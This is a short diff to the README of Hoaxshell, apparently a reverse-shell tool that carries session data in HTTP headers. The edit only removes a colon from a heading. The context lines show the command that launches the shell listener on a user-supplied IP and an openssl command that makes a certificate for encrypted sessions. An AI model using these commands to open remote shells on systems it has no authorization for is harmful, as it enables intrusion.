@@ -43,7 +43,7 @@ Hoaxshell utilizes an http header to transfer shell session info. By default, th
 sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization"
 ```
 
-#### Encrypted shell session (https):
+#### Encrypted shell session (https)
 ```
 # Generate self-signed certificate:
 openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
